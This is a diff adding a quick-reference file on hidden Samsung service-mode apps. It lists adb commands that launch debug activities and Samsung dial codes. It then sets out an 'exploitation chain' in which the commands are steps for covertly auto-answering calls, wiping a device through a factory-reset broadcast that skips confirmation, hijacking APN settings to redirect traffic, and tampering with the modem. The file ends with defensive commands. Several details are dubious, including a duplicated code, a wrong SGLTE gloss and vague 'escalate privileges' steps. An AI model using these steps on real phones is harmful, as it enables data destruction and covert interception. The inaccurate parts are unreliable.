@@ -1,0 +1,222 @@
+╔════════════════════════════════════════════════════════════════════════════════╗
+║              SERVICE MODE APPS - QUICK LAUNCH REFERENCE                       ║
+╚════════════════════════════════════════════════════════════════════════════════╝
+
+## RilServiceModeApp - com.sec.android.RilServiceModeApp
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+PRIMARY ENTRY POINT:
+  adb shell am start -n com.sec.android.RilServiceModeApp/.ServiceModeApp
+
+SPECIFIC ACTIVITIES:
+  # GCF/IMBF Mode Settings (RIL configuration)
+  adb shell am start -n com.sec.android.RilServiceModeApp/.GcfModeSettings
+
+  # View APN Information
+  adb shell am start -n com.sec.android.RilServiceModeApp/.ViewApnInfo
+
+  # RIL Logs Viewer
+  adb shell am start -n com.sec.android.RilServiceModeApp/.ViewRilLog
+
+  # Call Drop Log Analysis
+  adb shell am start -n com.sec.android.RilServiceModeApp/.CallDropLogView
+
+  # ⚠️ TERMINAL MODE (Potential shell access)
+  adb shell am start -n com.sec.android.RilServiceModeApp/.TerminalMode
+
+  # NAND Flash Header Read (File system access)
+  adb shell am start -n com.sec.android.RilServiceModeApp/.NandFlashHeaderRead
+
+  # Service Debug Dump
+  adb shell am start -n com.sec.android.RilServiceModeApp/.Svc_Dbg_Dump
+
+  # RIL State Dump
+  adb shell am start -n com.sec.android.RilServiceModeApp/.Sec_Ril_Dump
+
+SECRET CODE TRIGGERING (Dial Pad):
+  # These activate via broadcast when dialed as *#<code>#
+  # SecKeyStringBroadcastReceiver intercepts android_secret_code
+  *#*#<code>#*#*
+
+
+## servicemodeapp - com.sec.android.app.servicemodeapp
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+MODEM DEBUG ACTIVITIES:
+  # Generic Phone Utilities
+  adb shell am start -n com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil
+
+  # Qualcomm MDM9x35 (ESC Modem)
+  adb shell am start -n com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_ESC
+
+  # Qualcomm MDM9x15
+  adb shell am start -n com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_MDM9x15
+
+  # Broadcom Modem
+  adb shell am start -n com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_Bcom
+
+  # Marvell VIA Modem
+  adb shell am start -n com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_MarvellVIA
+
+  # MSM8960 UART/USB Config
+  adb shell am start -n com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.SetPortUartUsbMSM8960
+
+  # SGLTE (Single Radio VoLTE)
+  adb shell am start -n com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_SGLTE
+
+  # TD-SCDMA Modem
+  adb shell am start -n com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_TD
+
+CALL/CONNECTIVITY ACTIVITIES:
+  # ⚠️ AUTO-ANSWER (Answer calls automatically!)
+  adb shell am start -n com.sec.android.app.servicemodeapp/.AutoAnswer
+
+  # Show IMEI
+  adb shell am start -n com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.ShowIMEI
+
+  # Reset Total Call Time
+  adb shell am start -n com.sec.android.app.servicemodeapp/.ResetTotalCallTime
+
+USB & HARDWARE ACTIVITIES:
+  # ⚠️ USB PATH SWITCH (Enable/disable ADB, change USB mode)
+  adb shell am start -n com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.USBPathSwitch
+
+  # ⚠️ USB SETTINGS (Configure USB behavior)
+  adb shell am start -n com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.USBSettings
+
+  # UART/USB Config for CTC Model
+  adb shell am start -n com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.SetPortUartUSBCTCModel
+
+DIAGNOSTIC & DEBUG ACTIVITIES:
+  # WiFi Info Activity
+  adb shell am start -n com.sec.android.app.servicemodeapp/.WifiInfoActivity
+
+  # CP Debug Level Settings
+  adb shell am start -n com.sec.android.app.servicemodeapp/.CPDebugLevel
+
+  # System Debug Level
+  adb shell am start -n com.sec.android.app.servicemodeapp/.DebugLevel
+
+BROADCAST INTENTS (Permission-based):
+  # ⚠️⚠️⚠️ FACTORY RESET WITHOUT UI CONFIRMATION ⚠️⚠️⚠️
+  adb shell am broadcast -a com.samsung.intent.action.SEC_FACTORY_RESET_WITHOUT_FACTORY_UI \
+    com.sec.android.app.servicemodeapp
+  # Note: Requires MASTER_CLEAR permission (which this app has)
+
+  # WiFi Info Broadcast
+  adb shell am broadcast -a com.samsung.intent.WIFIINFO \
+    com.sec.android.app.servicemodeapp
+
+  # FTAT (Full Test Analysis & Troubleshooting) Dump
+  adb shell am broadcast -a com.sec.FTAT_DUMP \
+    com.sec.android.app.servicemodeapp
+
+  # Notification Dump Off
+  adb shell am broadcast -a com.sec.android.app.servicemodeapp.NOTIDUMP_OFF \
+    com.sec.android.app.servicemodeapp
+
+  # Boot Completed (triggers on device startup)
+  adb shell am broadcast -a android.intent.action.BOOT_COMPLETED \
+    com.sec.android.app.servicemodeapp
+
+
+## SECRET CODE PATTERNS (Dial Codes)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+These are intercepted by SecKeyStringBroadcastReceiver:
+
+Common Samsung Service Codes:
+  *#0*#          - Hardware test menu
+  *#06#          - IMEI display
+  *#1234#        - Build info
+  *#1111#        - FTA software version
+  *#2222#        - FTA hardware version
+  *#9999#        - System software version
+  *#9900#        - Log dump
+  *#197328640#   - Service test mode
+  *#0011#        - Service state info
+  *#0228#        - Battery info
+  *#0829#        - Modem debug log
+  *#0842#        - USB debugging mode
+  *#0873#        - SP Lock status
+  *#2263#        - RF bands info
+  *#2580#        - Keyboard test
+  *#9425#        - Graphics acceleration
+  *#0283#        - Audio loop-back test
+  *#0525#        - Caller ID test
+  *#0754#        - TraceView
+  *#0589#        - Light sensor test
+  *#0588#        - Proximity sensor test
+  *#0589#        - Light sensor test
+  *#0678#        - Accelerometer test
+  *#0681#        - Gyroscope test
+  *#0687#        - Compass test
+
+To broadcast these via ADB:
+  adb shell am broadcast -a android_secret_code --es \
+    android_secret_code_action "<code>" com.sec.android.RilServiceModeApp
+  
+  OR simply dial in phone app:
+  Dial: *#<code>#
+
+
+## VULNERABILITY EXPLOITATION CHAIN
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+SCENARIO 1: Disable Security via USB Switching
+  1. adb shell am start -n com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.USBPathSwitch
+  2. Disable ADB in USB settings
+  3. Re-enable via secret codes
+  4. Escalate privileges
+
+SCENARIO 2: Automatic Call Interception
+  1. adb shell am start -n com.sec.android.app.servicemodeapp/.AutoAnswer
+  2. Enable auto-answer mode
+  3. Any incoming call is answered automatically
+  4. Listen to calls without user knowledge
+
+SCENARIO 3: Factory Reset Attack
+  1. adb shell am broadcast -a com.samsung.intent.action.SEC_FACTORY_RESET_WITHOUT_FACTORY_UI \
+       com.sec.android.app.servicemodeapp
+  2. Device resets without confirmation
+  3. All user data erased
+  4. Device reverts to factory state
+
+SCENARIO 4: APN Hijacking (via RilServiceModeApp)
+  1. adb shell am start -n com.sec.android.RilServiceModeApp/.ViewApnInfo
+  2. Access/modify APN settings through test activities
+  3. Redirect all data through attacker's server
+  4. Intercept SMS, calls, data
+
+SCENARIO 5: Modem Control & Diagnostics
+  1. adb shell am start -n com.sec.android.app.servicemodeapp/com.sec.android.app.modemui.activities.PhoneUtil_ESC
+  2. Access Qualcomm modem debug interface
+  3. Read modem firmware/baseband
+  4. Access IMEI data
+  5. Modify modem configuration
+
+
+## DEFENDING AGAINST THESE ATTACKS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+DISABLE SERVICE MODE APPS:
+  adb shell pm disable com.sec.android.RilServiceModeApp
+  adb shell pm disable com.sec.android.app.servicemodeapp
+
+BLOCK BROADCAST RECEIVERS:
+  adb shell pm disable com.sec.android.RilServiceModeApp/.SecKeyStringBroadcastReceiver
+  adb shell pm disable com.sec.android.app.servicemodeapp/.ServiceModeAppBroadcastReceiver
+
+CHECK COMPONENT STATUS:
+  adb shell dumpsys package com.sec.android.RilServiceModeApp | grep enabled
+  adb shell dumpsys package com.sec.android.app.servicemodeapp | grep enabled
+
+MONITOR ACTIVATION:
+  adb logcat | grep -E "(ServiceModeApp|PhoneUtil|AutoAnswer|USBPath)"
+
+RESTRICT APN CHANGES:
+  adb shell settings put global allow_user_preferred_apn 0
+
+DISABLE SECRET CODES:
+  # Via Android Telephony settings
+  adb shell settings put secure secret_codes_enabled 0
